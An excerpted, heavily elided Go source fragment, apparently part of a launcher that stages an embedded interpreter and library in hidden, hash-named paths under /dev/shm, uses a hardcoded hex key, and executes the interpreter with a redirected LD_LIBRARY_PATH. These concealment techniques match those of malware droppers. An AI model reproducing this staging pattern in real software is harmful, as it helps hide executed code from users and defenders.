...
//go:embed .6b3d2304d0d84fc98e9c736601445e9f6905261386a770a2073f5e1a0d6cc223cb1ad7c5411d4886859b7443c7a3b308fbac00fee8f332359883cb9f3d16504c.lib/node
...
const hexKey = "9305d24ee137da77492834af357a5a34796de9bed81e30302d10f76a7884bfcd"
...
//  changed here to a specific location or deleted to only use the system interpreter
    intPath := fmt.Sprintf("%s/580daa6ea55134c31ccda2ad13cbda85169bee68f070771c32a8c170700a973c", "/dev/shm/.580daa6ea55134c31ccda2ad13cbda85169bee68f070771c32a8c170700a973c")
...
parts := strings.Fields(interp)
    ...
    // parts = append(parts, "<argument>")
     // Interpreter flags injected here (or it's just this comment)
...
if needsFile {
        ...
        tmpPath = fmt.Sprintf("%s/46ea149c89816b59da9fba571b2848138ef6c7a051b2baf1d4e025a0d6409130", "/dev/shm/.46ea149c89816b59da9fba571b2848138ef6c7a051b2baf1d4e025a0d6409130/")
...
cmd := exec.Command(intPath, parts[1:]...)
    cmd.Env = append(os.Environ(), "LD_LIBRARY_PATH=./.6b3d2304d0d84fc98e9c736601445e9f6905261386a770a2073f5e1a0d6cc223cb1ad7c5411d4886859b7443c7a3b308fbac00fee8f332359883cb9f3d16504c.lib")
